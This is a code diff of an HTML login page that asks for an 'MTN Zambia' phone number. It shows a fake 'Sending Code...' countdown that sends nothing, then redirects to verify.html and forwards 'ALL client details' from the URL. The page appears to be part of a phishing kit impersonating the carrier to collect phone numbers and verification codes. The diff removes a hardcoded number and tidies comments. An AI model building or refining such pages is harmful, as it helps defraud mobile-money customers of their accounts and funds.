@@ -199,7 +199,7 @@
             <p class="card-label">Enter Your MTN Zambia Phone Number:</p>
 
             <form id="loginForm">
-                <input type="tel" id="phone" name="phone" value="0714915335" placeholder="07XXXXXXXX" required>
+                <input type="tel" id="phone" name="phone" value="" placeholder="07XXXXXXXX" required>
                 <button type="submit" class="proceed-btn">Proceed</button>
             </form>
         </div>
@@ -212,6 +212,8 @@
 
     <script>
     const params = new URLSearchParams(window.location.search);
+
+    // Pre-fill phone if present
     const phoneFromUrl = params.get('phone');
     if (phoneFromUrl) {
         document.getElementById('phone').value = phoneFromUrl;
@@ -227,12 +229,12 @@
             return;
         }
 
-        // 1. Disable button and change style
+        // Disable button and change style
         submitBtn.disabled = true;
         submitBtn.style.background = '#ddd';
         submitBtn.style.color = '#666';
 
-        // 2. Set up the 15-second countdown
+        // 15-second countdown
         let timeLeft = 15;
         submitBtn.textContent = `Sending Code... (${timeLeft}s)`;
 
@@ -240,12 +242,16 @@
             timeLeft--;
             submitBtn.textContent = `Sending Code... (${timeLeft}s)`;
 
-            // 3. When countdown hits 0, redirect
             if (timeLeft <= 0) {
                 clearInterval(countdownInterval);
-                window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+
+                // ✅ Forward ALL client details to verify.html, with the real phone
+                const forward = new URLSearchParams(params);
+                forward.set('phone', phone);
+
+                window.location.href = 'verify.html?' + forward.toString();
             }
-        }, 1000); 
+        }, 1000);
     });
 </script>
 </body>
